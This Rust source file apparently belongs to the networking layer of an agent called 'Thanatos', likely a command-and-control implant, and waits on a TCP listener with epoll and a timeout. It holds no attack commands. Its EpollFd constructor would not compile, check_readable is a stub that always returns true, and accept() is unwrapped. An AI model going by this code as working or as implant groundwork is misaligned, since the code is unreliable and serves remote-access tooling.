use std::{
    net::{TcpListener, TcpStream},
    os::fd::{AsRawFd, RawFd},
    time::Duration,
};

use agent_utils::errors::{ProfileInternalError, ThanatosError};

struct EpollFd(i32);

impl EpollFd {
    pub fn new(fd: impl Into<RawFd>) -> Result<Self, ProfileInternalError> {
        if fd == -1 {
            return Err(ProfileInternalError::Fatal);
        }

        Ok(Self(fd))
    }
}

impl Drop for EpollFd {
    fn drop(&mut self) {
        unsafe {
            libc::close(self.0);
        }
    }
}

pub fn poll_timeout(
    listener: &mut TcpListener,
    timeout: Duration,
) -> Result<TcpStream, ThanatosError> {
    let efd = EpollFd::new(unsafe { libc::epoll_create1(libc::EPOLL_CLOEXEC) })
        .map_err(|e| ThanatosError::ProfileError(e))?;

    let mut ev = libc::epoll_event {
        events: (libc::EPOLLIN | libc::EPOLLOUT) as u32,
        u64: listener.as_raw_fd() as u64,
    };

    if unsafe { libc::epoll_ctl(efd.0, libc::EPOLL_CTL_ADD, listener.as_raw_fd(), &mut ev) } == -1 {
        return Err(ThanatosError::ProfileError(ProfileInternalError::Fatal));
    }

    const MAX_EVENTS: i32 = 2;

    let mut events: [libc::epoll_event; MAX_EVENTS as usize] = unsafe { std::mem::zeroed() };

    let nfds = unsafe {
        libc::epoll_wait(
            efd.0,
            events.as_mut_ptr(),
            MAX_EVENTS,
            timeout
                .as_millis()
                .try_into()
                .map_err(|_| ThanatosError::ProfileError(ProfileInternalError::Fatal))?,
        )
    };

    if nfds == -1 {
        return Err(ThanatosError::ProfileError(ProfileInternalError::Fatal));
    }

    if events.iter().any(|e| e.u64 == listener.as_raw_fd() as u64) {
        return Ok(listener.accept().unwrap().0);
    }

    Err(ThanatosError::ProfileError(
        ProfileInternalError::NoConnection,
    ))
}

pub fn check_readable(timeout: Duration) -> bool {
    true
}
